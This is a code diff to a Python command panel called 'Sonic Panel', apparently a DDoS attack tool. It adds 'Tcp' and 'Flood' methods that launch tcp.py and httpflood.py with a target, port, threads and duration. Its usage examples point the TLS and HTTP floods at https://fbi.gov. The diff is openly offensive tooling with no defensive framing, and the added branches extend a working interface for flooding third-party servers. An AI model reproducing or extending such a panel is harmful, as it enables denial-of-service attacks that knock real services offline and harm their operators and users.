@@ -76,10 +76,11 @@ login()
 def menu():
         print("\nWelcome To Sonic Panel")
         print(f'''
-\033[92m__Building__Author__  : \033[93m@GadaLuBau
-\033[92m__Collaborative__Author : \033[93m@Valen
-\033[92m__Shell__Author : \033[93m @GadaLuBau X Valen
-\033[92m__Total__User__Access__ : \033[93m[ 192 ]
+\033[92m__Building__Author__      : \033[93m@GadaLuBau
+\033[92m__Collaborative__Author   : \033[93m@Valen
+\033[92m__Shell__Author           : \033[93m@GadaLuBau X Valen
+\033[92m__Total__User__Access__   : \033[93m[ 192 ]
+\033[92m__How_To_Use_This_Panel__ : \033[93mHelp
            ''')
 
 def Help():
@@ -102,7 +103,7 @@ def Layer7():
 	print('''
                \x1b[38;2;59;241;250m ソ\033[94mニ\x1b[38;2;224;0;142mッ\x1b[38;2;224;0;042m・\x1b[38;2;124;0;342mクパ・ネルMethods.                                    
             \033[94m—   \x1b[38;2;0;255;189mTls  \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull    
-            \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null  \033[94m  —   \033[93mNull 
+            \033[94m—   \x1b[38;2;0;255;189mFlood\033[94m  — \033[92m  Null  \033[94m  —   \033[93mNull 
             \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
             \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
             \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull       
@@ -112,7 +113,7 @@ def Layer4():
                \x1b[38;2;59;241;250m ソ\033[94mニ\x1b[38;2;224;0;142mッ\x1b[38;2;224;0;042m・\x1b[38;2;124;0;342mクパ・ネルMethods.                                    
             \033[94m—   \x1b[38;2;0;255;189mUdp  \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull    
             \033[94m—   \x1b[38;2;0;255;189mSamp \033[94m  — \033[92m  Null  \033[94m  —   \033[93mNull 
-            \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
+            \033[94m—   \x1b[38;2;0;255;189mTcp  \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
             \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
             \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull       
    ''')
@@ -146,7 +147,7 @@ def main():
                     times=cnc.split()[5]
                     os.system(f"python udp.py {ip} {port} {packet} {threads} {times}")
               except IndexError:
-                    print("Usage : udp <ip> <port> <packet> <threads> <times>")
+                    print("Usage : Udp <ip> <port> <packet> <threads> <times>")
                     print("Example : udp 127.0.0.1:53 60")
         elif "Samp" in cnc:
               try:
@@ -159,6 +160,17 @@ def main():
               except IndexError:
                     print("Usage : Samp <ip> <port> <choice (y)> <packet> <threads>")
                     print("Example : Samp 127.0.0.1 7777 y 1000 1000")
+        elif "Tcp" in cnc:
+              try:
+                    ip=cnc.split()[1]
+                    port=cnc.split()[2]
+                    packet=cnc.split()[3]
+                    threads=cnc.split()[4]
+                    times=cnc.split()[5]
+                    os.system(f"python tcp.py {ip} {port} {packet} {threads} {times}")
+              except IndexError:
+                    print("Usage : Tcp <ip> <port> <packet> <threads> <times>")
+                    print("Example : Tcp 127.0.0.1:53 60")
 #layer7
         elif "Tls" in cnc:
               try:
@@ -171,6 +183,16 @@ def main():
               except IndexError:
                     print("Usage : Tls <target> <time> <rate> <threads> <proxyfile>")
                     print("Example : Tls https://fbi.gov/ 120 1000 10 proxy.txt")
+        elif "Flood" in cnc:
+              try:
+                    proxy=cnc.split()[1]
+                    target=cnc.split()[2]
+                    time=cnc.split()[3]
+                    request=cnc.split()[4]
+                    os.system(f"python httpflood.py {proxy} {target} {time} {request}")
+              except IndexError:
+                    print("Usage : Flood <proxy> <target> <time> <request>")
+                    print("Example : Flood proxy.txt https://fbi.gov 120 1000")
 def author(kiohana):
 	print ("Shell Credit : GadaLuBau")
 	print ("Building The Methods : Xinzu")
